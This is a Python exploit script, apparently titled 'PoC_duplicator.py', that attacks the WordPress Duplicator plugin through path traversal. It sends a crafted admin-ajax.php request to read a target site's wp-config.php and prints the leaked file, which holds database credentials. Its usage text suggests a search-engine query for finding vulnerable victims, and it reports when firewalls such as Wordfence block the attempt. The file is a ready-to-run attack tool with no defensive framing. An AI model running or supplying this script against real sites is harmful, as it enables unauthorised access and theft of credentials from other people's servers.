import requests
from sys import argv
import re

regex_url = r"^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$"

try:
    victim = argv[1]
    try:
        matches = re.search(regex_url, victim)
        valid = matches.group(0)
    except AttributeError:
        print("Valid Syntax:")
        print("PoC_duplicator.py www.example.com")
        print("PoC_duplicator.py example.com")
        print(" ")
        print('Also try: inurl:"/wp-content/plugins/duplicator/" for finding targets')
        exit(1)

except IndexError as e:
    print(e)
print("Target: ",victim)
if victim:  
    vuln = "https://"+ victim + "/wp-content/plugins/duplicator/"
    is_vuln = requests.get(vuln, verify=False)
    is_vuln = is_vuln.text
    if "404 Not Found" in is_vuln:
        print("Target not vulnerable.")
    
    else:
        target = "https://"+ victim +"/wp-admin/admin-ajax.php?action=duplicator_download&file=/../wp-config.php"
        head_r = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "de,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        response = requests.get(target, headers=head_r, verify=False)
        response = response.text

        if "403 Forbidden" in response:
            print("- Firewall blocked you.")
            if "by Wordfence" in response:
                print("-- Wordfence Firewall detected.")
        elif "302 Moved Temporarily" in response:
            print("Redirect and/or not vulnerable.")
        elif "400 Bad Request" in response:
            print("- Server blocked you.")
            if "Cloudfront" in response:
                print("-- Cloudfront detected.")
        elif "Not Found" in response:
            print("- Not Found and not vulnerable")
        elif "Access Denied" in response:
            print("- You got an Access Denied")
        elif "No Results Found" in response:
            print("No results found message on page.")
        else:
            print("VULN URL: ",vuln)
            print(response)
